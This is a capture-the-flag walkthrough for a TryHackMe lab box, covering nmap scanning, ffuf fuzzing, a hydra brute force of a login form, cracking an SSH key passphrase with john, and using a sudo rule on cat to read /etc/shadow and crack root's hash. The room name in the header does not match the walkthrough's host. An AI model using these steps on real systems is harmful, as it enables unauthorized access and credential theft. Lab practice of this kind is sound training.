---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Brooklyn Nine Nine
# DESCRIPTION       . This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/brooklynninenin
```

```bash
sudo nmap -sSVC -T5 10.10.176.165 -p- -oN brute
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b0ebf14fa54b35c4415edb25da0ac8f (RSA)
|   256 d03a8155135e870ce8521ecf44e03a54 (ECDSA)
|_  256 dace79e045eb1725ef62ac98f0cfbb04 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

- I've decided to fuzz the webserver since there wasn't anything interesting going on and I did not have credentials for ssh.

```
ffuf -u http://10.10.176.165/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10]
```

- on this page, we find a simple login form along with a hint in the source code

```
<!-- Hey john, if you do not remember, the username is admin -->
```

- I ran `hydra` against the login form to find the password.

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.176.165 http-post-form "/admin/:user=admin&pass=^PASS^:F=invalid" -I
```

- Here we find the `RSA private key` for user `john` and one of the flags.

- The key is protected by a passphrase which we can crack using `john`. 

```bash
ssh2john rsa > rsa_crack
john rsa_crack

# where rsa is the file containing the private RSA key.
```

- The second flag is located in `/home/john/user.txt`

```
john@bruteit:~$ sudo -l

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

- That's an easy privilege escalation vector.

- To find root's password, we can use `sudo cat /etc/shadow` and get the `root` hash. 

- Save it to a file and run john against it. 

```
/opt/john/run/john rootpasswd 

f[redacted]l         (root)     
```

- The last flag is located in `/root/root.txt`.

- Of course, you can directly use `sudo cat /root/root.txt` but the challenge asks for root's password.